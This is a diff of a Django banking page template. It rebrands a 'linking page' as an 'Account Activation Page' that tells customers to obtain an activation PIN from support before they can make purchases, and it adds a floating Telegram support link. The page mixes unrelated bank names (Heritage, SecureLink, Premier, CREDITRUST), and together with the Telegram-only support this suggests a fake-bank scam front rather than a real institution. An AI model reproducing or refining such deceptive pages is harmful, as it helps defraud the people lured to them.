@@ -4,14 +4,36 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Streamline Online Banking</title>
-<link rel="stylesheet" href="{% static 'css/dash.css' %}">
-<link rel="icon" href="{% static 'images/web_logo.jpg' %}" type="image/x-icon" />
+<title>Heritage Bank - linking page</title>
+<link rel="stylesheet" href="{% static 'css/main.css' %}">
+<link rel="icon" href="{% static 'images/logos.webp' %}" type="image/x-icon" />
+
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
 <style>
-  body{
-    background: linear-gradient(135deg, #000e17, #2994ff);
-  }
+  
+/* Telegram Icon */
+.telegram-icon {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    background-color: #0088cc;
+    color: white;
+    font-size: 30px;
+    width: 50px;
+    height: 50px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+    text-decoration: none;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    transition: transform 0.2s ease-in-out;
+}
+
+.telegram-icon:hover {
+    transform: scale(1.1);
+}
 .main-content {
     padding: 20px;
     margin-top: 60px; /* Adjust based on the height of the navbar */
@@ -119,9 +141,13 @@ button:hover {
 </style>
 </head>
 <body>
+     <a href="https://t.me/CREDITRUST_Customersupport" class="telegram-icon" target="_blank">
+        <i class="fab fa-telegram"></i>
+     </a>
+  
     <!-- Premier Bank Header -->
     <header class="premier-bank-header">
-      <h1>Linking Page</h1>
+      <h1>Account Activation Page</h1>
       <a style="text-decoration: none; color: #fff;" href="">
       <div class="notification-bell" onclick="vibrateBell()">
         <i class="fas fa-bell"></i>
@@ -133,7 +159,6 @@ button:hover {
     <!-- Sidebar -->
     <div id="sidebar" class="sidebar">
       <div class="sidebar-header">
-          <h2>Sidebar Menu</h2>
           <button class="close-sidebar" onclick="toggleSidebar()">Close</button>
       </div>
 
@@ -170,24 +195,33 @@ button:hover {
           <li><a href="{% url 'logout' %}">Logout</a></li>
       </ul>
   </div>
-
+<br><br>
 <div class="container">
   <div class="content">
     <h1>Welcome to SecureLink Banking</h1>
-    <h2>Link Your Account for Seamless Transactions</h2>
-    
+    <h2>Activate Your Account with an Activation PIN</h2>
+
     <p>Dear Valued Customer,</p>
-    <p>We are excited to inform you about a new enhancement to our online banking services at SecureLink Banking. As part of our commitment to providing you with the utmost security and convenience, we are introducing a mandatory account linking process with our payment system.</p>
-   
-    <h3>Get Started Today</h3>
-    <p>We encourage you to take advantage of this opportunity to enhance your banking experience with SecureLink Banking. Simply visit our website or mobile app to begin the linking process.</p>
-    
-    <p>Thank you for choosing SecureLink Banking for your financial needs. Should you have any questions or require assistance, our customer support team is available 24/7 to assist you.</p>
+    <p>We are pleased to inform you about an important update to our banking services at SecureLink Banking. To enhance the security and ease of your transactions, we are introducing a new account activation PIN process.</p>
+
+    <h3>How It Works</h3>
+    <p>To activate your account and enable purchases, you will need to use an activation PIN. This PIN is essential for verifying your account and ensuring secure transactions. Please follow these simple steps:</p>
+    <ol>
+      <li>Log in to our website or mobile app.</li>
+      <li>Navigate to the Account Activation section.</li>
+      <li>Enter the activation PIN provided to you.</li>
+      <li>Complete the activation process to start making purchases.</li>
+    </ol>
+
+    <p>If you haven't received your activation PIN, please contact our customer support team to request it. We are here to assist you 24/7 with any questions or issues you may have.</p>
+
+    <p>Thank you for choosing SecureLink Banking. We look forward to providing you with a secure and efficient banking experience.</p>
   </div>
 
+
   <div class="form-container">
-    <h2>Link Your Account</h2>
-    <h2>Link Account</h2>
+    <h2>Activate Your Account</h2>
+    <h2>Activate Account</h2>
     {% if messages %}
             {% for message in messages %}
                 <div class="alert alert-{{ message.tags }}">
@@ -203,6 +237,7 @@ button:hover {
     <div class="loader" id="loader"></div>
 
   </div>
+</div>
 </div>
 
 <script type="text/javascript">
